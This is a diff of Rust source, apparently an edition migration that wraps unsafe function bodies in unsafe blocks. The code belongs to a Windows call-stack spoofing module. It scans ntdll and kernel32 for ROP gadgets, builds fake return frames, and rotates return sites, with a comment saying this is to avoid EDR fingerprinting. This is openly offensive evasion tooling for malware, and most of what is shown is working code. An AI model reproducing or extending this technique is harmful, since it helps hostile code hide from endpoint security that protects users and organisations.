@@ -63,7 +63,7 @@ pub struct FakeFrame {
 }
 
 
-pub unsafe fn initialize_spoof_gadgets() -> bool {
+pub unsafe fn initialize_spoof_gadgets() -> bool { unsafe {
     let g = &mut *GADGETS.0.get();
     if g.initialized {
         return true;
@@ -85,13 +85,13 @@ pub unsafe fn initialize_spoof_gadgets() -> bool {
 
     g.initialized = g.count_ntdll > 0 && g.count_kernel32 > 0;
     g.initialized
-}
+}}
 
 
 /**
  * Scan a module .txt section for ROP gadget 
  * */
-unsafe fn scan_module_for_gadgets(module_base: HANDLE, gadgets: &mut [*mut c_void; 8 as usize]) -> usize {
+unsafe fn scan_module_for_gadgets(module_base: HANDLE, gadgets: &mut [*mut c_void; 8 as usize]) -> usize { unsafe {
     if module_base.is_null() {
         return 0;
     }
@@ -122,7 +122,7 @@ unsafe fn scan_module_for_gadgets(module_base: HANDLE, gadgets: &mut [*mut c_voi
 
     for i in 0..number_of_sections {
         let section = first_section.add(i * 40);
-        let name = first_section.add(i * 40);
+        let _name = first_section.add(i * 40);
         let name = core::slice::from_raw_parts(section, 8);
         if name[0] == b'.' && name[1] == b't' && name[2] == b'e' && name[3] == b'x' && name[4] == b't' {
             text_rva = *(section.add(12) as *const u32) as usize;
@@ -171,7 +171,7 @@ unsafe fn scan_module_for_gadgets(module_base: HANDLE, gadgets: &mut [*mut c_voi
     }
 
     count
-}
+}}
 
 
 /**
@@ -183,7 +183,7 @@ unsafe fn scan_module_for_gadgets(module_base: HANDLE, gadgets: &mut [*mut c_voi
  *      -> actual function call    
  * Each call rotates through different return sites to avoid EDR fingerprinting of repeated identical call stacks     
  * */
-pub unsafe fn call_with_spoofed_stack(function: *mut c_void, args: &[usize]) -> i32 {
+pub unsafe fn call_with_spoofed_stack(function: *mut c_void, args: &[usize]) -> i32 { unsafe {
     let g = &*GADGETS.0.get();
     if !g.initialized || g.count_ntdll == 0 || g.count_kernel32 == 0 {
         return call_direct(function, args);
@@ -234,12 +234,12 @@ pub unsafe fn call_with_spoofed_stack(function: *mut c_void, args: &[usize]) -> 
     core::hint::black_box(&frame3);
 
     result
-}
+}}
 
 /**
  * Fallback: this to call a function directly without stack spoof
  * */
-unsafe fn call_direct(function: *mut c_void, args: &[usize]) -> i32 {
+unsafe fn call_direct(function: *mut c_void, args: &[usize]) -> i32 { unsafe {
     match args.len() {
         0 => {
             let f: unsafe extern "system" fn() -> i32 = core::mem::transmute(function);
@@ -263,11 +263,11 @@ unsafe fn call_direct(function: *mut c_void, args: &[usize]) -> i32 {
             )
         }
     }
-}
+}}
 
 /**
  * Returns a reference to the resolved gadgets
  * */
-pub unsafe fn spoof_gadgets() -> &'static SpoofGadgets {
+pub unsafe fn spoof_gadgets() -> &'static SpoofGadgets { unsafe {
     &*GADGETS.0.get()
-} 
+}} 
